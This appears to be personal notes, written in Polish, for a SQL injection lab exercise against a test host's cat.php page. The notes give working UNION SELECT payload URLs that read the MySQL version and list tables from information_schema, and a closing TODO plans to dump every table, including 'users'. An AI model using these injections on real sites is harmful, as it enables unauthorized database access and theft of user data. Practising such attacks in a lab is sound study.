TODO: sprawdzic ile kolumn jest

```
http://vulnerable/cat.php?id=1%20dowolny%20string
```

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'dowolny string' at line 1
```

wiemy ze jest mysql

w mysql zeby sprawdzic wersje @@version

```
http://vulnerable/cat.php?id=1%20union%20select%201,%20@@version,%203,%204
```

dostajemy

```
5.1.63-0+squeeze1
```

## undefined index

```
http://vulnerable/cat.php?dowolny%20string%20id=1
```

[undefined index](\img\cat_undefined.png)

## database

```
http://vulnerable/cat.php?id=1%20union%20select%201,%20table_name,%203,%204%20from%20information_schema.tables
```

[tabele](\img\tables.png)

```
CHARACTER_SETS
COLLATIONS
COLLATION_CHARACTER_SET_APPLICABILITY
COLUMNS
COLUMN_PRIVILEGES
ENGINES
EVENTS
FILES
GLOBAL_STATUS
GLOBAL_VARIABLES
KEY_COLUMN_USAGE
PARTITIONS
PLUGINS
PROCESSLIST
PROFILING
REFERENTIAL_CONSTRAINTS
ROUTINES
SCHEMATA
SCHEMA_PRIVILEGES
SESSION_STATUS
SESSION_VARIABLES
STATISTICS
TABLES
TABLE_CONSTRAINTS
TABLE_PRIVILEGES
TRIGGERS
USER_PRIVILEGES
VIEWS
categories
pictures
users
```

TODO: Wziac wszystkie wartosci z kazdej z tabel